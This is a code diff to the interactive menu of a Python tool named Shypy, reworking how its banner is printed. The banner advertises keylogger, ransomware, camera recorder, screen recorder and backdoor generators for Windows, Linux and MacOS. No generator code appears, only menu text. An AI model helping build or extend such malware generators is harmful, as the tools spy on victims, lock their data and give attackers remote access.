@@ -68,23 +68,18 @@ class Shypy(Utils):
         """
         try:
             self.clear()
-            print(f"""{COLOR['CYAN']}
-            ╔════════════════════════════╦══════════════════════╦════════════════════════╗
-            ║* Version : {V} {' ' * 9}  *║ Welcome To The Shypy ║*     {' ' * 10}       *║
-            ╠════════════════════════════╩═════════╦════════════╩════════════════════════╣
-            ║             Module Name              ║          Operating System           ║  
-            ╠══════════════════════════════════════╬═════════════════════════════════════╣
-            ║[1] Keylogger Generator               :    [ Windows | Linux | MacOS ]      ║
-            ║[2] Ransomware Generator              :    [ Windows | Linux | MacOS ]      ║
-            ║[3] Camera Recorder Generator         :    [ Windows | Linux | MacOS ]      ║
-            ║[4] Screen Recorder Generator         :    [ Windows | Linux | MacOS ]      ║   
-            ║[5] Back Door Generator               :    [ Windows | Linux | MacOS ]      ║
-            ╠══════════════════════════════════════╬═════════════════════════════════════╣
-            ║ "use" <number>                       : Used To Select Modules.             ║
-            ║ "exit"                               : To Log Out Of Shypy.                ║  
-            ╠═════════════════════════╦════════════╩═══════════════╦═════════════════════╣
-            ║*                       *║ Developed by Atahan Poyraz ║*                   *║
-            ╚═════════════════════════╩════════════════════════════╩═════════════════════╝\n""")
+            print(f'\t {COLOR['CYAN']}{' ' * 3}╔════════════════════════════╦══════════════════════╦════════════════════════╗')           
+            print(f'\t {COLOR['CYAN']}{' ' * 3}║* Version : {V} {' ' * 9}  *║ Welcome To The Shypy ║*      {' ' * 10}      *║')            
+            print(f'\t {COLOR['CYAN']}{' ' * 3}╠════════════════════════════╩═════════╦════════════╩════════════════════════╣')           
+            print(f'\t {COLOR['CYAN']}{' ' * 3}║             Module Name              ║          Operating System           ║')
+            print(f'\t {COLOR['CYAN']}{' ' * 3}╠══════════════════════════════════════╬═════════════════════════════════════╣')         
+            for i, module in enumerate(MODULES): print(f'\t{' ' * 4}║ [{i + 1}] {module["NAME"].ljust(33)}:{' ' * 7}{str(module["OS"]).replace("'", "")}{' ' * 6} ║')
+            print(f'\t {COLOR['CYAN']}{' ' * 3}╠══════════════════════════════════════╬═════════════════════════════════════╣')
+            print(f'\t {COLOR['CYAN']}{' ' * 3}║ "use" <number>                       : Used To Select Modules.             ║')           
+            print(f'\t {COLOR['CYAN']}{' ' * 3}║ "exit"                               : To Log Out Of Shypy.                ║')         
+            print(f'\t {COLOR['CYAN']}{' ' * 3}╠═════════════════════════╦════════════╩═══════════════╦═════════════════════╣')            
+            print(f'\t {COLOR['CYAN']}{' ' * 3}║*                       *║ Developed by Atahan Poyraz ║*                   *║')            
+            print(f'\t {COLOR['CYAN']}{' ' * 3}╚═════════════════════════╩════════════════════════════╩═════════════════════╝')   
         
             option = input(f"{COLOR["CYAN"]}{FLAG}{COLOR["RESET"]}").lower().strip()
             
